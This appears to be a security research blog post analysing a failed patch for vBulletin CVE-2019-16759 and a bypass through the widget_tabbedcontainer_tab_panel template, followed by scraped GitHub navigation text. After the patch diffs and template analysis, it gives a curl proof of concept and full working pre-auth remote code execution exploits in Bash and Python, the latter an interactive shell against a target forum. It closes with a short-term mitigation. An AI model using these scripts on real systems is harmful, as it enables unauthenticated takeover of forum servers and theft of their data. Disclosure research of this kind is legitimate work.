| ``` 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136  ``` | ```          /**           *      Remove any problematic values from the template           *      variable arrays before rendering           */          //for now don't pass the values through.  These arrays are potentially large          //and we don't want to make unnecesary copies.  The alternative is to pass by          //reference which causes it's own headaches.  It's an internal function and the          //relevant arrays are all class variables.          private function cleanRegistered()          {                     $disallowedNames = array('widgetConfig');                  foreach($disallowedNames AS $name)                  {                             unset($this->registered[$name]);                          unset(self::$globalRegistered[$name]);                  }          } ``` |
| --- | --- |

/\*\*
\* Remove any problematic values from the template
\* variable arrays before rendering
\*/
//for now don't pass the values through. These arrays are potentially large
//and we don't want to make unnecesary copies. The alternative is to pass by
//reference which causes it's own headaches. It's an internal function and the
//relevant arrays are all class variables.
private function cleanRegistered()
{
$disallowedNames = array('widgetConfig');
foreach($disallowedNames AS $name)
{
unset($this->registered[$name]);
unset(self::$globalRegistered[$name]);
}
}

The above function was added but unfortunately had to be obtained from the code as opposed to directly from a diff between the two coded bases. This is because vBulletin doesn’t provide the older insecure versions of their software after a patch is released. Therefore, the above code was pulled directly from 5.5.4 Patch Level 2.

The above “cleanRegistered” function was added as the first fix to the vulnerability and simply iterates through a list of non-allowed “registered variables”, deleting their contents when found. This list when added only contained the name of the single variable which contained the php code to execute in the released exploit.

In the next version of the software (vBulletin 5.5.5), the following pieces were added to further prevent future problems with the widget\_rendering template code.

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  ``` | ``` diff -ur vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/frontend/applicationlight.php --- vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php	2020-08-08 06:40:31.356918994 -0500 +++ vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/frontend/applicationlight.php	2020-08-08 06:40:40.577517014 -0500 @@ -286,20 +286,32 @@  			throw new vB5_Exception_Api('ajax', 'render', array(), 'invalid_request');  		}   -		$this->router = new vB5_Frontend_Routing(); -		$this->router->setRouteInfo(array( -			'action'          => 'actionRender', -			'arguments'       => $serverData, -			'template'        => $routeInfo[2], -			// this use of $_GET appears to be fine, -			// since it's setting the route query params -			// not sending the data to the template -			// render -			'queryParameters' => $_GET, -		)); -		Api_InterfaceAbstract::setLight(); +		$templateName = $routeInfo[2]; +		if ($templateName == 'widget_php') +		{ +			$result = array( +				'template' => '', +				'css_links' => array(), +			); +		} +		else +		{ +			$this->router = new vB5_Frontend_Routing(); +			$this->router->setRouteInfo(array( +				'action'          => 'actionRender', +				'arguments'       => $serverData, +				'template'        => $templateName, +				// this use of $_GET appears to be fine, +				// since it's setting the route query params +				// not sending the data to the template +				// render +				'queryParameters' => $_GET, +			)); +			Api_InterfaceAbstract::setLight(); +			$result = vB5_Template::staticRenderAjax($templateName, $serverData); +		}   -		$this->sendAsJson(vB5_Template::staticRenderAjax($routeInfo[2], $serverData)); +		$this->sendAsJson($result);  	}    	/** ``` |
| --- | --- |

diff -ur vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.4\_Patch\_Level\_2/upload/includes/vb5/frontend/applicationlight.php vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.5/upload/includes/vb5/frontend/applicationlight.php
--- vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.4\_Patch\_Level\_2/upload/includes/vb5/frontend/applicationlight.php 2020-08-08 06:40:31.356918994 -0500
+++ vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.5/upload/includes/vb5/frontend/applicationlight.php 2020-08-08 06:40:40.577517014 -0500
@@ -286,20 +286,32 @@
throw new vB5\_Exception\_Api('ajax', 'render', array(), 'invalid\_request');
}
- $this->router = new vB5\_Frontend\_Routing();
- $this->router->setRouteInfo(array(
- 'action' => 'actionRender',
- 'arguments' => $serverData,
- 'template' => $routeInfo[2],
- // this use of $\_GET appears to be fine,
- // since it's setting the route query params
- // not sending the data to the template
- // render
- 'queryParameters' => $\_GET,
- ));
- Api\_InterfaceAbstract::setLight();
+ $templateName = $routeInfo[2];
+ if ($templateName == 'widget\_php')
+ {
+ $result = array(
+ 'template' => '',
+ 'css\_links' => array(),
+ );
+ }
+ else
+ {
+ $this->router = new vB5\_Frontend\_Routing();
+ $this->router->setRouteInfo(array(
+ 'action' => 'actionRender',
+ 'arguments' => $serverData,
+ 'template' => $templateName,
+ // this use of $\_GET appears to be fine,
+ // since it's setting the route query params
+ // not sending the data to the template
+ // render
+ 'queryParameters' => $\_GET,
+ ));
+ Api\_InterfaceAbstract::setLight();
+ $result = vB5\_Template::staticRenderAjax($templateName, $serverData);
+ }
- $this->sendAsJson(vB5\_Template::staticRenderAjax($routeInfo[2], $serverData));
+ $this->sendAsJson($result);
}
/\*\*

This portion of the patch created an if statement that would return empty template or css data if the ‘widget\_php’ template was listed as the last portion of the route. These two changes prevented the PoC from functioning in its released state.

The third change can be found in the second part of the vBulletin 5.5.5 update diff.

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  ``` | ```  	diff -ur vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/template/runtime.php --- vBulletin/vBulletin/vb5_connect/vBulletin-5.5.4_Patch_Level_2/upload/includes/vb5/template/runtime.php	2020-08-08 06:40:31.276913797 -0500 +++ vBulletin/vBulletin/vb5_connect/vBulletin-5.5.5/upload/includes/vb5/template/runtime.php	2020-08-08 06:40:40.493511575 -0500 @@ -12,6 +12,26 @@    class vB5_Template_Runtime  { +	//This is intended to allow the runtime to know that template it is rendering. +	//It's ugly and shouldn't be used lightly, but making some features widely +	//available to all templates is uglier. +	private static $templates = array(); + +	public static function startTemplate($template) +	{ +		array_push(self::$templates, $template); +	} + +	public static function endTemplate() +	{ +		array_pop(self::$templates); +	} + +	private static function currentTemplate() +	{ +		return end(self::$templates); +	} +  	public static $units = array(  		'%',  		'px', @@ -1944,6 +1964,21 @@  			return '<div style="border:1px solid red;padding:10px;margin:10px;">' . htmlspecialchars($timerName) . ': ' . $elapsed . '</div>';  		}  	} + +	public static function evalPhp($code) +	{ +		//only allow the PHP widget template to do this.  This prevents a malicious user +		//from hacking something into a different template. +		if (self::currentTemplate() != 'widget_php') +		{ +			return ''; +		} +		ob_start(); +		eval($code); +		$output = ob_get_contents(); +		ob_end_clean(); +		return $output; +	}  } ``` |
| --- | --- |

diff -ur vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.4\_Patch\_Level\_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.5/upload/includes/vb5/template/runtime.php
--- vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.4\_Patch\_Level\_2/upload/includes/vb5/template/runtime.php 2020-08-08 06:40:31.276913797 -0500
+++ vBulletin/vBulletin/vb5\_connect/vBulletin-5.5.5/upload/includes/vb5/template/runtime.php 2020-08-08 06:40:40.493511575 -0500
@@ -12,6 +12,26 @@
class vB5\_Template\_Runtime
{
+ //This is intended to allow the runtime to know that template it is rendering.
+ //It's ugly and shouldn't be used lightly, but making some features widely
+ //available to all templates is uglier.
+ private static $templates = array();
+
+ public static function startTemplate($template)
+ {
+ array\_push(self::$templates, $template);
+ }
+
+ public static function endTemplate()
+ {
+ array\_pop(self::$templates);
+ }
+
+ private static function currentTemplate()
+ {
+ return end(self::$templates);
+ }
+
public static $units = array(
'%',
'px',
@@ -1944,6 +1964,21 @@
return '<div style="border:1px solid red;padding:10px;margin:10px;">' . htmlspecialchars($timerName) . ': ' . $elapsed . '</div>';
}
}
+
+ public static function evalPhp($code)
+ {
+ //only allow the PHP widget template to do this. This prevents a malicious user
+ //from hacking something into a different template.
+ if (self::currentTemplate() != 'widget\_php')
+ {
+ return '';
+ }
+ ob\_start();
+ eval($code);
+ $output = ob\_get\_contents();
+ ob\_end\_clean();
+ return $output;
+ }
}

This portion was added as a layer of redundancy to attempt to prevent any non ‘widget\_php’ template from loading the eval code. Based on the comment in the code, this is an attempt to prevent a user from modifying a template to incorrectly call the ‘evalPhp’ without doing so from an embedded php widget.

## Problems Ahead

The problem with the above arises because of how the vBulletin template system is structured. Specifically, templates aren’t actually written in PHP but instead are written in a language that is first processed by the template engine and then is output as a string of PHP code that is later ran through an eval() during the “rendering” process. Templates are also not a standalone item but can be nested within other templates, in that one template can have a number of child templates embedded within. For example, take the following template.

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  ``` | ``` 		<template name="widget_php" templatetype="template" date="1569453621" username="vBulletin" version="5.5.5 Alpha 4"><![CDATA[<vb:if condition="empty($widgetConfig) AND !empty($widgetinstanceid)"> 	{vb:data widgetConfig, widget, fetchConfig, {vb:raw widgetinstanceid}} </vb:if>   <vb:if condition="!empty($widgetConfig)"> 	{vb:set widgetid, {vb:raw widgetConfig.widgetid}} 	{vb:set widgetinstanceid, {vb:raw widgetConfig.widgetinstanceid}} </vb:if>   <div class="b-module{vb:var widgetConfig.show_at_breakpoints_css_classes} canvas-widget default-widget custom-html-widget" id="widget_{vb:raw widgetinstanceid}" data-widget-id="{vb:raw widgetid}" data-widget-instance-id="{vb:raw widgetinstanceid}">   	{vb:template module_title, 		widgetConfig={vb:raw widgetConfig}, 		show_title_divider=1, 		can_use_sitebuilder={vb:raw user.can_use_sitebuilder}}   	<div class="widget-content"> 		<vb:if condition="!empty($widgetConfig['code']) AND !$vboptions['disable_php_rendering']"> 			<vb:comment> 				Do not eval anything other than the widgetConfig code -- anything else could potentially come 				from a malicious user.  Do not use phpeval outside of this template.  Ever. 			</vb:comment> 			{vb:phpeval {vb:raw widgetConfig.code}} 		<vb:else /> 			<vb:if condition="$user['can_use_sitebuilder']"> 				<span class="note">{vb:phrase click_edit_to_config_module}</span> 			</vb:if> 		</vb:if> 	</div> </div>]]></template> ``` |
| --- | --- |

<template name="widget\_php" templatetype="template" date="1569453621" username="vBulletin" version="5.5.5 Alpha 4"><![CDATA[<vb:if condition="empty($widgetConfig) AND !empty($widgetinstanceid)">
{vb:data widgetConfig, widget, fetchConfig, {vb:raw widgetinstanceid}}
</vb:if>
<vb:if condition="!empty($widgetConfig)">
{vb:set widgetid, {vb:raw widgetConfig.widgetid}}
{vb:set widgetinstanceid, {vb:raw widgetConfig.widgetinstanceid}}
</vb:if>
<div class="b-module{vb:var widgetConfig.show\_at\_breakpoints\_css\_classes} canvas-widget default-widget custom-html-widget" id="widget\_{vb:raw widgetinstanceid}" data-widget-id="{vb:raw widgetid}" data-widget-instance-id="{vb:raw widgetinstanceid}">
{vb:template module\_title,
widgetConfig={vb:raw widgetConfig},
show\_title\_divider=1,
can\_use\_sitebuilder={vb:raw user.can\_use\_sitebuilder}}
<div class="widget-content">
<vb:if condition="!empty($widgetConfig['code']) AND !$vboptions['disable\_php\_rendering']">
<vb:comment>
Do not eval anything other than the widgetConfig code -- anything else could potentially come
from a malicious user. Do not use phpeval outside of this template. Ever.
</vb:comment>
{vb:phpeval {vb:raw widgetConfig.code}}
<vb:else />
<vb:if condition="$user['can\_use\_sitebuilder']">
<span class="note">{vb:phrase click\_edit\_to\_config\_module}</span>
</vb:if>
</vb:if>
</div>
</div>]]></template>

This template would be rendered to the following PHP code.

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  ``` | ``` $final_rendered = '' . '';  if (empty($widgetConfig) AND !empty($widgetinstanceid)) {   $final_rendered .= '\r\n\t' . '';    $widgetConfig = vB5_Template_Runtime::parseData('widget', 'fetchConfig', $widgetinstanceid);   $final_rendered .= '' . '\r\n';\n\t\t\t\t } else {   $final_rendered .= ''; } $final_rendered .= '' . '\r\n\r\n' . ''; if (!empty($widgetConfig)) {   $final_rendered .= '\r\n\t' . '';   $widgetid = $widgetConfig['widgetid'];   $final_rendered .= '' . '\r\n\t' . '';   $widgetinstanceid = $widgetConfig['widgetinstanceid'];   $final_rendered .= '' . '\r\n';\n\t\t\t\t } else {   $final_rendered .= ''; } $final_rendered .= '' . '\r\n\r\n<div class="b-module' . vB5_Template_Runtime::vBVar($widgetConfig['show_at_breakpoints_css_classes']) . ' canvas-widget default-widget custom-html-widget" id="widget_' . $widgetinstanceid . '" data-widget-id="' . $widgetid . '" data-widget-instance-id="' . $widgetinstanceid . '">\r\n\r\n\t' . vB5_Template_Runtime::includeTemplate('module_title',array('widgetConfig' => $widgetConfig, 'show_title_divider' => '1', 'can_use_sitebuilder' => $user['can_use_sitebuilder'])) . '\r\n\r\n\t<div class="widget-content">\r\n\t\t' . '';   if (!empty($widgetConfig['code']) AND !vB::getDatastore()->getOption('disable_php_rendering')) {   $final_rendered .= '\r\n\t\t\t' . '' . '\r\n\t\t\t' . vB5_Template_Runtime::evalPhp('' . $widgetConfig['code'] . '') . '\r\n\t\t'; } else {   $final_rendered .= '\r\n\t\t\t' . '';   if ($user['can_use_sitebuilder']) {     $final_rendered .= '\r\n\t\t\t\t<span class="note">' . vB5_Template_Runtime::parsePhrase("click_edit_to_config_module") . '</span>\r\n\t\t\t';   } else {     $final_rendered .= '';   }   $final_rendered .= '' . '\r\n\t\t'; } $final_rendered .= '' . '\r\n\t</div>\r\n</div>'; ``` |
| --- | --- |

$final\_rendered = '' . '';
if (empty($widgetConfig) AND !empty($widgetinstanceid)) {
$final\_rendered .= '\r\n\t' . '';
$widgetConfig = vB5\_Template\_Runtime::parseData('widget', 'fetchConfig', $widgetinstanceid);
$final\_rendered .= '' . '\r\n';\n\t\t\t\t
} else {
$final\_rendered .= '';
}
$final\_rendered .= '' . '\r\n\r\n' . '';
if (!empty($widgetConfig)) {
$final\_rendered .= '\r\n\t' . '';
$widgetid = $widgetConfig['widgetid'];
$final\_rendered .= '' . '\r\n\t' . '';
$widgetinstanceid = $widgetConfig['widgetinstanceid'];
$final\_rendered .= '' . '\r\n';\n\t\t\t\t
} else {
$final\_rendered .= '';
}
$final\_rendered .= '' . '\r\n\r\n<div class="b-module' . vB5\_Template\_Runtime::vBVar($widgetConfig['show\_at\_breakpoints\_css\_classes']) . ' canvas-widget default-widget custom-html-widget" id="widget\_' . $widgetinstanceid . '" data-widget-id="' . $widgetid . '" data-widget-instance-id="' . $widgetinstanceid . '">\r\n\r\n\t' . vB5\_Template\_Runtime::includeTemplate('module\_title',array('widgetConfig' => $widgetConfig, 'show\_title\_divider' => '1', 'can\_use\_sitebuilder' => $user['can\_use\_sitebuilder'])) . '\r\n\r\n\t<div class="widget-content">\r\n\t\t' . '';
if (!empty($widgetConfig['code']) AND !vB::getDatastore()->getOption('disable\_php\_rendering')) {
$final\_rendered .= '\r\n\t\t\t' . '' . '\r\n\t\t\t' . vB5\_Template\_Runtime::evalPhp('' . $widgetConfig['code'] . '') . '\r\n\t\t';
} else {
$final\_rendered .= '\r\n\t\t\t' . '';
if ($user['can\_use\_sitebuilder']) {
$final\_rendered .= '\r\n\t\t\t\t<span class="note">' . vB5\_Template\_Runtime::parsePhrase("click\_edit\_to\_config\_module") . '</span>\r\n\t\t\t';
} else {
$final\_rendered .= '';
}
$final\_rendered .= '' . '\r\n\t\t';
}
$final\_rendered .= '' . '\r\n\t</div>\r\n</div>';

Then after being rendered, when the code is later pushed through the eval process, the other portion of its child templates are loaded and also ran through eval.

This type of system may seem innocuous to the untrained eye but the approach opens up a number of issues beyond just the insecure uses of an eval calls.

Regardless, here are a few ways this can fail.

* Any non-filtered modifications to the output variable will open up the code for another code execution.
* Constant filtering required of all template code for situations which can create non-escaped PHP.
* XSS filtering nightmares
* Included child code will have access to parent declared variables.

I cannot think of many situations where this would be the optimal approach. However, to keep this analysis to the point, I’ll focus on the issues leading to a bypass.

## Bypassing CVE-2019-16759

The patch code mentioned in one of the previous sections above may seem thorough, but the approach is actually somewhat short sighted. Specifically, the patch faces issues when encountering a user controlled child template in that a parent template will be checked to verify that the routestring does not end with a widget\_php route. However we are still prevented from providing a payload within the widgetConfig value because of code within the rendering process, which cleans the widgetConfig value prior to the templates execution. This problem is remedied for us because of a lucky solution manifesting in the following template.

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ``` | ``` 		<template name="widget_tabbedcontainer_tab_panel" templatetype="template" date="1532130449" username="vBulletin" version="5.4.4 Alpha 2"><![CDATA[{vb:set panel_id, {vb:concat {vb:var id_prefix}, {vb:var tab_num}}} <div id="{vb:var panel_id}" class="h-clearfix js-show-on-tabs-create h-hide"> 	<vb:comment> 	- {vb:var panel_id}  	<vb:each from="subWidgets" value="subWidget"> 	&nbsp;&nbsp;-- {vb:raw subWidget.template} 	</vb:each> 	</vb:comment>   	<vb:each from="subWidgets" value="subWidget"> 		{vb:template {vb:raw subWidget.template},  			widgetConfig={vb:raw subWidget.config},  			widgetinstanceid={vb:raw subWidget.widgetinstanceid}, 			widgettitle={vb:raw subWidget.title},  			tabbedContainerSubModules={vb:raw subWidget.tabbedContainerSubModules}, 			product={vb:raw subWidget.product} 		} 	</vb:each>     </div>]]></template> ``` |
| --- | --- |

<template name="widget\_tabbedcontainer\_tab\_panel" templatetype="template" date="1532130449" username="vBulletin" version="5.4.4 Alpha 2"><![CDATA[{vb:set panel\_id, {vb:concat {vb:var id\_prefix}, {vb:var tab\_num}}}
<div id="{vb:var panel\_id}" class="h-clearfix js-show-on-tabs-create h-hide">
<vb:comment>
- {vb:var panel\_id}
<vb:each from="subWidgets" value="subWidget">
&nbsp;&nbsp;-- {vb:raw subWidget.template}
</vb:each>
</vb:comment>
<vb:each from="subWidgets" value="subWidget">
{vb:template {vb:raw subWidget.template},
widgetConfig={vb:raw subWidget.config},
widgetinstanceid={vb:raw subWidget.widgetinstanceid},
widgettitle={vb:raw subWidget.title},
tabbedContainerSubModules={vb:raw subWidget.tabbedContainerSubModules},
product={vb:raw subWidget.product}
}
</vb:each>
</div>]]></template>

The template “widget\_tabbedcontainer\_tab\_panel”, which is displayed above is a perfect assistant in bypassing the previous CVE-2019-16759 patch because of two key features.

1. The templates ability to load a user controlled child template.
2. The template loads the child template by taking a value from a separately named value and placing it into a variable named “widgetConfig”.

**These two characteristics of the “widget\_tabbedcontainer\_tab\_panel” template allow us to effectively bypass all filtering previously done to prevent CVE-2019-16759 from being exploited.**

## PoC

Because of the vulnerabilities simplicity, creating a one line command line exploit is as simple as the following.

| ``` 1  ``` | ``` curl -s http://EXAMPLE.COM/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' ``` |
| --- | --- |

curl -s http://EXAMPLE.COM/ajax/render/widget\_tabbedcontainer\_tab\_panel -d 'subWidgets[0][template]=widget\_php&subWidgets[0][config][code]=phpinfo();'

## Full Exploit(s)

Below is a list of a few full exploit payloads written in multiple different languages including Bash, Python and Ruby.

### Bash Exploit

| ``` 1 2 3 4 5 6 7 8 9  ``` | ``` #!/bin/bash # # vBulletin (widget_tabbedcontainer_tab_panel) 5.x 0day by @Zenofex #<br># Usage ./exploit <site> <shell-command><br> # Urlencode cmd CMD=`echo $2|perl -MURI::Escape -ne 'chomp;print uri_escape($_),"\n"'`   # Send request curl -s $1/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20shell_exec("'+$CMD+'");exit;' ``` |
| --- | --- |

#!/bin/bash
#
# vBulletin (widget\_tabbedcontainer\_tab\_panel) 5.x 0day by @Zenofex
#<br># Usage ./exploit <site> <shell-command><br>
# Urlencode cmd
CMD=`echo $2|perl -MURI::Escape -ne 'chomp;print uri\_escape($\_),"\n"'`
# Send request
curl -s $1/ajax/render/widget\_tabbedcontainer\_tab\_panel -d 'subWidgets[0][template]=widget\_php&subWidgets[0][config][code]=echo%20shell\_exec("'+$CMD+'");exit;'

### Python Exploit

| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ``` | ``` #!/usr/bin/env python3 # vBulletin 5.x pre-auth widget_tabbedContainer RCE exploit by @zenofex   import argparse import requests import sys   def run_exploit(vb_loc, shell_cmd):     post_data = {'subWidgets[0][template]' : 'widget_php',                 'subWidgets[0][config][code]' : "echo shell_exec('%s'); exit;" % shell_cmd                 }     r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' % vb_loc, post_data)     return r.text   ap = argparse.ArgumentParser(description='vBulletin 5.x Ajax Widget Template RCE') ap.add_argument('-l', '--location', required=True, help='Web address to root of vB5 install.') ARGS = ap.parse_args()   while True:     try:         cmd = input("vBulletin5$ ")         print(run_exploit(ARGS.location, cmd))     except KeyboardInterrupt:         sys.exit("\nClosing shell...")     except Exception as e:         sys.exit(str(e)) ``` |
| --- | --- |

#!/usr/bin/env python3
# vBulletin 5.x pre-auth widget\_tabbedContainer RCE exploit by @zenofex
import argparse
import requests
import sys
def run\_exploit(vb\_loc, shell\_cmd):
post\_data = {'subWidgets[0][template]' : 'widget\_php',
'subWidgets[0][config][code]' : "echo shell\_exec('%s'); exit;" % shell\_cmd
}
r = requests.post('%s/ajax/render/widget\_tabbedcontainer\_tab\_panel' % vb\_loc, post\_data)
return r.text
ap = argparse.ArgumentParser(description='vBulletin 5.x Ajax Widget Template RCE')
ap.add\_argument('-l', '--location', required=True, help='Web address to root of vB5 install.')
ARGS = ap.parse\_args()
while True:
try:
cmd = input("vBulletin5$ ")
print(run\_exploit(ARGS.location, cmd))
except KeyboardInterrupt:
sys.exit("\nClosing shell...")
except Exception as e:
sys.exit(str(e))

### Metasploit Module

We’re also in the process of pushing a public metasploit module to the metasploit-framework project, the pull request for which can be [found here](https://github.com/rapid7/metasploit-framework/pull/13970)

![](/wp-content/uploads/2020/08/image.png)
## Slides

I’ve also published slides: [Exploiting vBulletin 5.6.2 – A Tale of a Patch Fail](https://download.exploitee.rs/file/vbulletin/Exploiting_vBulletin_5.6.2_A_Tale_of_a_Patch_Fail.pptx)

## A Short Term Fix

This fix will disable PHP widgets within your forums and may break some functionality but will keep you safe from attacks until a patch is released by vBulletin.

1. Go to the vBulletin administrator control panel.
2. Click “Settings” in the menu on the left, then “Options” in the dropdown.
3. Choose “General Settings” and then click “Edit Settings”
4. Look for “Disable PHP, Static HTML, and Ad Module rendering”, Set to “Yes”
5. Click “Save”

Godspeed and Happy DEFCON Safe Mode

---

### One Comment on “Exploiting vBulletin: “A Tale of a Patch Fail””

1. ![](https://secure.gravatar.com/avatar/514ea4c08faf79df094f26988b0bf4e0?s=26&d=identicon&r=r)
   1
   [hacxx](http://Website) said at 8:05 pm on August 16th, 2020:

   Seems like your vuln is already patched. I test it today against a few vBulletin 5 and it doesn’t work.

### Recent Posts

* [ORP – The Open Research Project](/2021/orp-the-open-research-project/)
* [ViziOwn – Exploiting the Vizio SmartCast Platform](/2021/viziown-exploiting-vizio-smartcast/)
* [Exploiting vBulletin: “A Tale of a Patch Fail”](/2020/exploiting-vbulletin-a-tale-of-patch-fail/)
* [Rooting the FireTV Cube and Pendant with FireFU](/2018/rooting-the-firetv-cube-and-pendant-with-firefu/)
* [All Your Things Are Belong To Us](/2017/all-your-things-are-belong-to-us/)

### Archives

* [April 2021](/2021/04/)
* [February 2021](/2021/02/)
* [August 2020](/2020/08/)
* [October 2018](/2018/10/)
* [August 2017](/2017/08/)
* [March 2017](/2017/03/)
* [January 2017](/2017/01/)
* [October 2015](/2015/10/)
* [February 2015](/2015/02/)
* [December 2014](/2014/12/)
* [June 2014](/2014/06/)
* [December 2013](/2013/12/)
* [August 2013](/2013/08/)
* [July 2013](/2013/07/)
* [May 2013](/2013/05/)
* [January 2013](/2013/01/)
* [December 2012](/2012/12/)
* [August 2012](/2012/08/)
* [July 2012](/2012/07/)
* [February 2012](/2012/02/)
* [December 2011](/2011/12/)
* [November 2011](/2011/11/)
* [October 2011](/2011/10/)
* [August 2011](/2011/08/)
* [July 2011](/2011/07/)
* [June 2011](/2011/06/)
* [May 2011](/2011/05/)
* [April 2011](/2011/04/)
* [February 2011](/2011/02/)
* [January 2011](/2011/01/)

### Categories

* [Asus](/category/asus/)
* [Google TV Kernels](/category/google-tv-kernels/)
* [GTVHacker](/category/gtvhacker/)
* [Hisense](/category/hisense/)
* [Logitech Revue](/category/logitech-revue/)
* [NAS](/category/nas/)
* [Nest](/category/nest/)
* [Netgear](/category/netgear/)
* [Roku](/category/roku/)
* [Root](/category/root/)
* [Routers](/category/routers/)
* [Sony](/category/sony-2/)
* [Uncategorized](/category/uncategorized/)
* [Updates](/category/updates/)
* [Western Digital](/category/western-digital/)

© Copyright 2025 | Exploitee.rs | All Rights Reserved



=== Content from github.com_270b96d7_20250119_141609.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fcommit%2F19618d9bd259c0f9d3b28b53b0ba41a71420430a)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fcommit%2F19618d9bd259c0f9d3b28b53b0ba41a71420430a)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  410](/rapid7/metasploit-framework/issues)
* [Pull requests
  37](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
